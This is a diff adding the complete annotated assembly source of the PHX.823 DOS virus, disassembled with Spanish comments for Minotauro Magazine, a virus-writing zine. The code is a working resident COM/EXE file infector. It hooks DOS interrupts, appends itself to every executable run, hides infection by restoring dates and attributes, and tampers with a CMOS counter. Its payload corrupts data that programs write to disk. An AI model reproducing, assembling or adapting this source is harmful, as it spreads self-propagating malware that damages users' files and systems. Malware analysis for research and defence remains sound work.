@@ -1,0 +1,510 @@
+; Virus: PHX (PHX.823, Willistrover, o mejor, Tracker)
+; Infector parasitico de COM/EXE, residente via MCB
+
+; Desensamblado por Trurl para Minotauro Magazine
+
+code segment para public
+	assume cs:code, ds:code, es:code, ss:code
+	org 100h
+	.386
+vsize			equ		vend-vstart
+vsip			equ		(vsize+15)/16
+
+start:
+	jmp vstart
+	db 0, 21h
+
+	db "Oh! Que hago aqui en el area [Virus Sources] de esta BBS, si yo "
+	db "pertenezco a una nota de Minotauro Magazine? Oh! "
+	db "Lo mas gracioso es que he observado que los Sysops ni siquiera se"
+	db "molestan en sacar estos textos antes de poner estos virus en las"
+	db "areas de Virus Sources de sus BBS. Los miraran los sources?"
+	db "No dejen de leer el proximo numero!"
+	db "	Trurl, TGC [Iaba Daba DAN]"
+
+vstart: ; instalacion desde un COM.
+	PUSH	CS		; para despues poder salir con un RETF
+	PUSH	100h
+	PUSH	CS
+	MOV	AX,0B974h ; Chequeo de residencia
+	INT	21h
+	CMP	AX,2888h ; BUG :-) Se carga en memoria + de 1 vez, si se corren
+	JZ	inmem	; varios COM infectados... :-(. El valor seria 2808h
+	MOV	BX,cs:[101h] ; obtener el offset del virus dentro del file
+	ADD	BX,103h	; mediante sumar 103 al JMP NEAR del principio
+
+	CALL	mcbres		; residencia via MCB
+	CALL	hookints	; colgarse de las ints
+inmem:
+	; restablecer los 3 bytes originales. Estos 3 bytes estan en el c¢digo.
+	; por eso todo este quilombo.
+	db 	36h,0c7h,6,0,1; MOV WORD PTR SS:[100], orbytes1
+orbytes1		db		0b4h, 4ch
+	db		36h, 0c6h,6,2,1; MOV WORD PTR SS:[102], orbytes2
+orbytes2		db		0cdh
+	POP	AX
+	MOV	DS,AX	; DS=ES=CS
+	MOV	ES,AX
+	RETF	; ir al prog. original
+
+instlexe: ; instalacion desde un EXE
+	MOV	AX,ES
+	ADD	AX,10h ; ax = fin del PSP
+	ADD	cs:[Instl_CS-vstart],AX ; realocatear para el JMP
+	ADD	cs:[Instl_SS-vstart],AX
+	MOV	AX,0B974h ; Chequeo de residencia
+	INT	21h
+	CMP	AX,2808h ; este esta bien.
+	JZ	inmemexe
+	PUSH	ES
+	PUSH	DS
+	XOR	BX,BX ; el virus esta en el off. cero
+	CALL	mcbres ; quedar residente
+	CALL	hookints ; colgarse de todo..
+	POP	DS
+	POP	ES
+inmemexe:
+	; para poner SS:SP y CS:IP (el JMP) en los valores originales..
+	; estos valores estan "en el c¢digo", de nuevo.
+	MOV	SS,cs:[Instl_SS-vstart]
+	db 0bch ; mov sp, Instl_SP
+Instl_SP	  dw	0
+	db 0eah; JMP far
+Instl_IP   dw 	0
+Instl_CS   dw  0
+Instl_SS   dw  0
+
+mcbres: ; residencia MCB..
+; en BX viene el offset del virus, en ES devuelve el bloque en mem. alta.
+	PUSH	BX
+	MOV	AX,ES
+	DEC	AX
+	MOV	ES,AX
+	MOV	BX,es:[3] ; BX=Size del bloque
+	SUB	BX,(endheap-vstart+15)/16+1; restar 41h para
+	INC	AX
+	MOV	ES,AX
+	MOV	AH,4Ah ; resizear el bloque a 41h para menos.
+	INT	21h
+	MOV	AH,48h ; pedir 40 para.
+	MOV	BX,(endheap-vstart+15)/16; 40h
+	INT	21h
+	DEC	AX
+	MOV	ES,AX
+	MOV	WORD PTR es:[1],8; owner=dos
+	MOV	WORD PTR es:[8],5053h; en el field name pone "SP".. ?
+	INC	AX
+	MOV	ES,AX
+	XOR	DI,DI
+	POP	SI ; ds:si=vir. en mem.
+	MOV	BX,SI
+	MOV	CX,vsize; copiar el virus a mem. alta.
+	db 2eh ; CS:
+	REPZ
+	MOVSB
+	RET
+cmpadd:
+	; esto lo usa para reconocimiento de un programa... hace un c¢digo
+	; coherente (no es "texto") pero igual lo pongo asi porque nunca recibe
+	; el control, solo sirve para la comparacion.
+	db	73h,5,0BAh,0B9h,2,0EBh,0E0h,0A3h,0C0h,1,0B4h,3Fh,8Bh,1Eh,0C0h,1
+	db	72h,0C7h,0A3h,5,1,8Bh,0D8h,0B8h,0,3Fh,0B9h,0,1,0BAh,48h,0C8h
+	db	72h,0C1h,0A3h,5,1,8Bh,0D8h,0B8h,0,3Fh,0B9h,0,1,0BAh,1Ah,0CAh
+
+newint21:
+	CMP	AH,4Bh
+	JZ	execprog
+	CMP	AX,3D02h
+	JZ	openf
+	CMP	AX,0B974h
+	JZ	rescheck
+	CMP	AH,40h
+	JZ	write
+quit21:
+					db		0eah ; JMP FAR
+oldint21			dd		0
+
+write: ; activacion.
+	CMP	BYTE PTR cs:[actvar-vstart],1 ; ?
+	JZ	isone
+	JMP	quit21
+isone:
+	PUSH	AX
+	PUSH	SI
+	CMP	AX,1 ;
+	JZ	quitwrite
+	MOV	AL,5
+	OUT	70h,AL ; chequear que el contador de instalaciones en CMOS
+	IN	AL,71h	; sea mayor a 80h (128).
+	CMP	AL,80h
+	JB	quitwrite
+	MOV	SI,DX
+	ADD	SI,CX
+	XOR	BYTE PTR [SI],80h; ?
+quitwrite:
+	POP	SI
+	POP	AX
+	JMP	quit21
+
+call21: ; para llamar a int 21 original
+	PUSHF
+	PUSH	CS
+	CALL	quit21
+	RET
+
+rescheck: ; chequeo de residencia
+	MOV	AX,2808h
+	IRET
+
+newint24: ; dummy critical error handler
+	MOV	AX,3
+	IRET
+
+openf:
+	; este es el 1er disparador.
+	; busca el c¢digo mas arriba (cmpadd) con el c¢digo de retorno de esta
+	; llamada a abrir file (se entiende?)
+	PUSHA
+	PUSH	ES
+	MOV	DI,SP
+	MOV	AX,ss:[DI+14h]; CS en stack
+	MOV	ES,AX
+	MOV	AX,ss:[DI+12h]; IP en stack
+	MOV	DI,AX ; ES:DI = CS:IP del llamador
+	MOV	SI,cmpadd-vstart
+	MOV	DH,3
+doagain:
+	PUSH	DI
+	PUSH	SI
+	MOV	CX,10h
+keepcmp:
+	db 2eh ; cs:
+	CMPSB
+	JNZ	difrent
+	LOOP	keepcmp ; compara el c¢digo del CS:IP del llamador con el
+	JMP	itscode ; c¢digo mas arriba (cmpadd).
+	NOP
+difrent:
+	POP	SI
+	POP	DI
+	ADD	SI,10h ; si es distinto, intenta 3 veces.
+	DEC	DH		 ; incrementando 10 del c¢digo.
+	JNZ	doagain
+	POP	ES		; si en esas tres veces es distinto
+	POPA			; se va nomas.
+	JMP	quit21
+itscode:
+	CALL	varto1	; si es igual, pone la var. de activacion a 1
+	JMP	difrent
+
+execprog:
+	PUSHA
+	PUSH	ES
+	PUSH	DS
+	PUSH	DS
+	PUSH	ES
+
+	; esto es el 2do disparador.
+	; buscar PHX en el environment del programa actual
+	MOV	AH,62h ; conseguir segment del PSP actual
+	CALL	call21
+	MOV	ES,BX
+	MOV	SI,phxstr-vstart
+	MOV	ES,es:[2Ch] ; ES = environment del prog. actual
+	XOR	DI,DI
+searchagain:
+	PUSH	SI
+	PUSH	DI
+keepphx:
+	db 2eh
+	LODSB
+	OR	AL,AL
+	JZ	phxstrend
+	SCASB
+	JZ	keepphx
+phxstrend:
+	JZ	phxfound
+	; no encontro la string..
+	POP	DI
+	POP	SI
+	XOR	AL,AL
+	MOV	CX,100h
+	REPNZ SCASB
+	JNZ	nozero
+	CMP	BYTE PTR es:[DI],0; buscar el doble 0.
+	JNZ	nozero
+	JMP	searchagain ; si encontro el doble 0, busca de nuevo PHX en la
+					; siguiente string del environment. ???
+					; busca en nombre de programa actual?
+
+phxfound:; 2a9; encontro la string "PHX" en el environment del prog. actual
+	ADD	SP,4 ; desechar DI y SI en stack
+	CALL	varto1 ; poner la variable de activacion a 1
+nozero: ; 2af ;  no encontro la string, ni el doble cero
+
+	; recien ahora sucede la infeccion.
+	POP	ES ; es y ds originales
+	POP	DS
+	CALL	dumberr; setear int 24 a dumb
+	PUSH	DX
+	MOV	DI,DX; DS:DX nombre del prog a ejecutar
+	XOR	DL,DL
+	CMP	BYTE PTR [DI+1],3Ah; ":"
+	JNZ	skipdrive
+	MOV	DL,[DI]
+	SUB	DL,40h; de caracter a numero ("A"(41) -> 1)
+skipdrive:
+	MOV	AH,36h; get disk free space
+	INT	21h
+	CMP	BX,2 ; bx = available clusters
+	JNB	okspace
+	JMP	quitinf
+okspace:
+	POP	DX
+	MOV	CX,80h
+	XOR	AL,AL ; buscar el 0 del nombre
+	db 3eh ; ds:
+	REPNZ	SCASB
+	DEC	DI ; di apunta al 0
+	PUSH	word ptr [DI] ; ?
+	PUSH	DS
+	PUSH	DI
+	MOV	WORD PTR [DI],0021h ; poner un "!" al final?
+	MOV	cs:word ptr [nameptr-vstart],DS ; guardar el nameptr
+	MOV	cs:word ptr [nameptr-vstart+2],DX
+	XOR	AL,AL
+	CALL	fattr ; get attributes
+	MOV	cs:[vfattr-vstart],CX ; guardar atributos
+	MOV	AL,1
+	MOV	CX,20h
+	CALL	fattr ; set attributes to 20h
+	MOV	AX,3D02h ; abrir file
+	CALL	call21
+	MOV	BX,AX
+	JB	abortinf
+	MOV	AX,5700h ; get date & time
+	CALL	call21
+	MOV	cs:[ftime-vstart],CX ; save date and time
+	MOV	cs:[fdate-vstart],DX
+	MOV	AX,CS
+	MOV	DS,AX
+	CALL	readf
+	CMP	WORD PTR cs:[exehead-vstart],5A4Dh; es EXE?
+	JZ	isexe
+	MOV	AX,ds:[exehead-vstart] ; mandar los primero 3
+	MOV	CH,ds:[exehead-vstart+2] ; bytes a los MOVs de
+	MOV	ds:[orbytes1-vstart],AX ; la rutina de instalacion
+	MOV	ds:[orbytes2-vstart],CH ; de COM
+	CALL	checkinf
+	JZ	isinfd
+	CMP	AX,0FC00h; Size del COM-3 > a FC00?
+	JA	isinfd
+	MOV	ds:[exehead-vstart+1],AX ; fixear el JMP
+	MOV	BYTE PTR ds:[exehead-vstart],0E9h
+finishinf:
+	INC	WORD PTR cs:[infcount-vstart] ; un contador de infecciones
+	MOV	AH,40h ; escribir el virus al final
+	MOV	CX,vsize
+	XOR	DX,DX
+	CALL	call21
+	XOR	AL,AL
+	XOR	CX,CX
+	XOR	DX,DX
+	MOV	AH,42h ; ir al principio
+	CALL	call21
+	MOV	AH,40h ; escribir 1C bytes al principio
+	CALL	writef ; 3 fixeados + los otros (originales)
+isinfd:
+	MOV	CX,ds:[ftime-vstart]
+	MOV	DX,ds:[fdate-vstart]
+	MOV	AX,5701h ; restore original date & time
+	CALL	call21
+	MOV	AH,3Eh ; cerrar file
+	CALL	call21
+	MOV	AL,01
+	MOV	CX,ds:[vfattr-vstart]
+	CALL	fattr ; restore atributos originales
+abortinf:
+	POP	DI
+	POP	DS
+	POP	word ptr [DI]
+quitinf:
+	CALL	restorerr
+
+	; esto es el 3er disparador... chequear que el port 3E4 este activo
+	MOV	DX,3E4h ; el port 3E4 devuelve FF?
+	XOR	AH,AH
+	IN	AL,DX
+	CMP	AL,0FFh ; si lo devuelve, pone a 1 la variable de activacion
+	JZ	notvar
+	CALL	varto1
+notvar:
+	POP	DS
+	POP	ES
+	POPA
+	JMP	quit21
+
+isexe:
+	CALL	checkinf
+	JZ	isinfd ; si esta infectado, salir
+	PUSH	BX
+	ADD	AX,0003 ; DX.AX size del file - 3. Osea, ahora le suma 3. :-)
+	ADC	DX,0
+	PUSH	DX
+	PUSH	AX
+	MOV	AX,ds:[exehead-vstart+2]; 2 = reminder
+	MOV	BX,ds:[exehead-vstart+4]; 4 = Pages
+	MOV	CX,BX
+	SHR	CX,7 ; Pages = ffff=> 1ff.
+	SHL	BX,9 ; Pages = * 200h
+	OR	BX,AX
+	SUB	BX,0200h ; bx = size real?
+	SBB	CX,0; ?
+	MOV	DX,ds:[exehead-vstart+14h] ; 14 = IP
+	MOV	AX,ds:[exehead-vstart+16h] ; 16 = CS
+	MOV	ds:[Instl_IP-vstart],DX  ; Salver CS:IP originales en el c¢digo
+	MOV	ds:[Instl_CS-vstart],AX
+	MOV	DX,ds:[exehead-vstart+10h] ; 10 = SP
+	MOV	AX,ds:[exehead-vstart+0eh] ; 0E = SS
+	MOV	ds:[Instl_SS-vstart],AX  ; Salvar SS:SP originales en el c¢digo
+	MOV	ds:[Instl_SP-vstart],DX
+	POP	AX
+	POP	DX
+	CMP	CX,DX ; CX (2bytes + altos de size) = Pages?
+	JNZ	notl
+	CMP	BX,AX
+	JZ	allok
+notl:
+	POP	BX
+	JMP	isinfd ; si no son iguales, esta infectado
+allok:
+	MOV	BX,AX ; DX.AX size
+	NEG	BX
+	AND	BX,0Fh ; bx = lo que falta para el paragr.
+	ADD	AX,BX
+	ADC	DX,0; ugh
+	SHR	AX,4
+	SHL	DX,0Ch
+	OR	AX,DX ; AX = nuevo CS
+	SUB	AX,ds:[exehead-vstart+8] ; AX =- header size;
+	MOV	WORD PTR ds:[exehead-vstart+14h],instlexe-vstart ; nuevo IP
+	MOV	ds:[exehead-vstart+0Eh],AX ; nuevo SS
+	MOV	WORD PTR ds:[exehead-vstart+10h],400h ; nuevo SP
+	MOV	ds:[exehead-vstart+16h],AX ; nuevo CS
+	MOV	AH,40h ; escribir los bytes que faltan
+	MOV	CX,BX	; para el para
+	XOR	DX,DX
+	POP	BX
+	INT	21h
+	ADD	CX,vsize
+	ADD	ds:[exehead-vstart+2],CX
+	MOV	CX,ds:[exehead-vstart+2]
+	AND	WORD PTR ds:[exehead-vstart+2],1FFh ; fixear el reminder
+	SHR	CX,9
+	ADD	ds:[exehead-vstart+4],CX ; fixear las pages !
+	JMP	finishinf ; ir a finalizar todo pipi cucu
+
+checkinf: ; rutina chequeo de infeccion previa
+	MOV	AX,4202h
+	MOV	CX,0FFFFh; -1
+	MOV	DX,0FFFDh; -3
+	CALL	call21 ; ir a los ultimos 3 bytes
+	PUSH	AX
+	PUSH	DX
+	MOV	DX,buff3b-vstart
+	MOV	AH,3Fh
+	MOV	CX,3
+	CALL	call21 ; leer los ultimos 3 bytes
+	CMP	WORD PTR ds:[buff3b-vstart],0828h ; es igual a 28 08 93?
+	JNZ	notinf
+	CMP	BYTE PTR ds:[buff3b-vstart+2],93h ; si es asi, esta infectado.
+notinf:
+	POP	DX
+	POP	AX
+	RET
+
+readf: ; leer 1c bytes del file
+	MOV	AH,3Fh
+writef: ; escribir 1c bytes al file
+	MOV	CX,001Ch; 28 bytes
+	MOV	DX,exehead-vstart ; ?
+	CALL	call21
+	RET
+
+hookints: ; colgarse de las interrupciones
+	MOV	AX,ES
+	MOV	DS,AX
+	MOV	AX,3521h
+	INT	21h
+	MOV	word ptr ds:[oldint21-vstart+2],ES
+	MOV	word ptr ds:[oldint21-vstart],BX
+	MOV	DX,newint21-vstart
+	MOV	AH,25h
+	INT	21h
+
+	MOV	AL,5
+	OUT	70h,AL ; incrementar el contador de instalaciones en CMOS
+	IN	AL,71h
+	INC	AL
+	OUT	71h,AL
+	RET
+
+fattr: ; poner atributos originales o conseguirlos (depende de AL)
+	MOV	DS,cs:word ptr [nameptr-vstart]
+	MOV	DX,cs:word ptr [nameptr-vstart+2]
+	MOV	AH,43h
+	INT	21h
+	RET
+
+dumberr:
+; setear int 24 a un dumb handler para prevenir mensajes de error
+	PUSH	DS
+	PUSH	ES
+	PUSH	DX
+	MOV	AX,3524h
+	INT	21h
+	MOV	cs:word ptr [oldint24-vstart],BX ; guardar int 24 orig.
+	MOV	cs:word ptr [oldint24-vstart+2],ES
+	MOV	DX,newint24-vstart
+	MOV	AX,CS
+	MOV	DS,AX
+doit:
+	MOV	AX,2524h ; setear nueva int 24
+	INT	21h
+	POP	DX
+	POP	ES
+	POP	DS
+	RET
+restorerr: ; restaurar int 24 original
+	PUSH	DS
+	PUSH	ES
+	PUSH	DX
+	MOV	DS,cs:word ptr [oldint24-vstart+2]
+	MOV	DX,cs:word ptr [oldint24-vstart]
+	JMP	doit
+
+	phxstr			db			"PHX",0
+
+varto1: ; setear variable de activacion a 1
+	MOV	BYTE PTR cs:[actvar-vstart],1
+	NOP
+	RET
+	; contador de infecciones
+infcount	dw	0;en mi ejemplar era 27. lindo numero.. :-)
+;3 bytes para reconocimiento... son arbitrarios? Es cierto que parece una fecha
+		db	28h, 8, 93h
+vend: ; aqui termina el c¢digo.
+
+	;heap. esto NO PERTENECE al virus en si, es memoria temporaria. ok?
+exehead		db	1ch dup(0) ; para leer 1c primero bytes del f.
+buff3b		db	3 dup(0); 3 byte buffer para chequeo de reinfecc.
+ftime		dw	0 ; original file time
+fdate		dw	0 ; original file date
+nameptr		dd	0 ; nameptr
+vfattr		dw	0 ; original file attributes
+oldint24	dd	0 ; original int 24
+actvar		db	0 ; variable de la activacion
+endheap:
+ends
+end start
+
